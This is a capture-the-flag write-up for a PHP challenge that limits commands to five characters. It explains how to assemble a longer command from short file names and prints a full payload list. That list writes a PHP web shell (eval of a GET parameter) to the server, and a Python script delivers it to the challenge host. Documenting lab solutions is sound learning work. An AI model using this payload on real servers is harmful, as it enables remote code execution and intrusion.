# Web: Less than 5 

![image](https://user-images.githubusercontent.com/74207547/164990551-4ab3d77a-363c-400e-932f-6063131ebac4.png)

## Website:

![image](https://user-images.githubusercontent.com/74207547/164990589-4978a78f-0952-46e6-ae9f-36a25ec5398a.png)

There is a blank white page. Let's test parameters from challenge description - `cmd` and `reset`

![image](https://user-images.githubusercontent.com/74207547/164990694-7b04edc3-8752-449b-b88e-620366e2f8f6.png)

![image](https://user-images.githubusercontent.com/74207547/164990699-6d901926-4fae-4b53-9b27-8c2214586ff2.png)

We don't get any output from that. Maybe we should search for some **edge cases** to see how app behaves.

![image](https://user-images.githubusercontent.com/74207547/164991052-8d48fafe-25ec-477c-b6d3-91b84153ce6e.png)

**Null byte** works as always in php scritps. Now we can check how length control is being handled.

![image](https://user-images.githubusercontent.com/74207547/164991027-ddf10e53-b2a7-4f43-8636-5ff3683febb1.png)
![image](https://user-images.githubusercontent.com/74207547/164990967-bedaee60-a230-4ff9-a7ac-8adf3d604add.png)

Input build of more than 5 characters is **not going throught exec function.**

## Fight with input length:

At first I thought the challenge was about simple command injection.
I tried using `*`, `>` to read flag or index.php but didn't get anything.
The length of 5 was too small to get any progress there.
The only thing that I acomplished was creating files with short names and reading them.
This led me to **executing ls and reading the output.**
![image](https://user-images.githubusercontent.com/74207547/164991334-687b6b23-0897-4d13-8acf-3a83715c427d.png)
![image](https://user-images.githubusercontent.com/74207547/164991343-4fd447ab-f0e9-4e1d-bfce-008700baad4b.png)

That's something. At that moment I knew the challenge is about creating payload from multiple files.
It is also said in challenge description that files are being removed every 2 mins so keep that in mind.

## Research:

After feeling a bit helpless I started to google for **short php** payloads. I stumbled upon few interesting articles.
* [blog.spacepatroldelta.com](https://blog.spacepatroldelta.com/a?ID=01800-96c1d853-a6ab-4a27-b2c5-157e586418d3)
* [blog.csdn.net/](https://blog.csdn.net/nzjdsds/article/details/102940762)


In above articles they are basically spliting the command `echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php` in multiple files.
Then they are using `ls -t>0` to sort files by the time they were created and put all of them into one file - `0`.
When that succeed they execute `0` with `sh 0` and the outcome is `1.php` file with php content - **`<?php eval($_GET[1]);`** which enables executing any command we want.
Backslashes `\\` keep all files as one payload and `${IFS}` is being used to replace one of the spaces.

![image](https://user-images.githubusercontent.com/74207547/164992329-77f4dacf-4211-4e8f-bc2d-1182fae6c29b.png)

The hardest part is executing `ls -t>0`. This line have much more than 5 chars so how they got around it?

![image](https://user-images.githubusercontent.com/74207547/164992694-919a57d3-18a9-4016-ae52-3b5fa4b8ce69.png)

**That's pure magic. How does it even work?**

First we need to understand few commands:
* dir - same as ls
* rev - reverses the input `echo 1234|rev` -> `4321`

So at first they are building a reversed payload. With `*>v` they are calling dir (first file in the folder in alphabetical order) which lists other files and then saves it to `v` file.
Next they uses rev to reverse the payload and move it to another file `0`
Well that works. Pretty crazy way to get around it.

**I found everything that is needed right? Copy, paste, run, didn't work. Unfortunately, it wasn't that simple.**

## Local setup

I created a simple php script that simulates the behavior of the challenge.
```php
<?php 
  if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5){exec($_GET['cmd']);}
?>
```

After a while I knew what didn't work. When building up a `ls -t` from files there is one diffrence between articles and actual challenge. We also have `index.php` in same directory which breaks the whole payload.

![image](https://user-images.githubusercontent.com/74207547/164993458-fca51e60-afec-4289-ac5a-d8cc49fc85ff.png)

Index.php got between the files and whole thing was messed up. I had to find reversed payload that will go after `index.php`

```
>dir
>n\>
>pt-
>l\|
>sl
*>v
>rev
*v>0
```

**Found it!** Below how it works.

![image](https://user-images.githubusercontent.com/74207547/164993612-daf15c12-49a7-4148-a232-0d4e3fd799bc.png)

# Solution:

I created simple python script which creates all the files needed and calls `1.php` endpoint to check if it worked.

```python
import requests 

url = "http://142.93.209.130:8003/?cmd={0}"

with open("payload.txt","r") as f:
        for i in f:
                print("[*]" + url.format(i.strip()))
                requests.get(url.format(i.strip())) 

test = requests.get("http://142.93.209.130:8002/1.php")
if test.status_code == requests.codes.ok:
        print("Success!!!")
```

```
payload.txt
>dir
>n\>
>pt-
>l\|
>sl
*>v
>rev
*v>0
>php
>1.\\
>\>\\
>d\\
>\-\\
>\ \\
>4\\
>e6\\
>s\\
>ba\\
>\|\\
>4K\\
>Pz\\
>7\\
>k\\
>XS\\
>x\\
>Fs\\
>V\\
>dF\\
>0\\
>kX\\
>g\\
>bC\\
>h\\
>XZ\\
>Z\\
>Ag\\
>H\\
>wa\\
>9\\
>PD\\
>\}\\
>FS\\
>I\\
>\{\\
>$\\
>ho\\
>ec\\
sh 0
sh n
```
![image](https://user-images.githubusercontent.com/74207547/164993848-6d436385-4934-4bb7-8873-755b58b3939b.png)
![image](https://user-images.githubusercontent.com/74207547/164993863-0feef127-dbce-4cab-ae6f-966020a5c176.png)

## FLAG: ictf{5ch4r5_4re_3n0ugh_bd903}
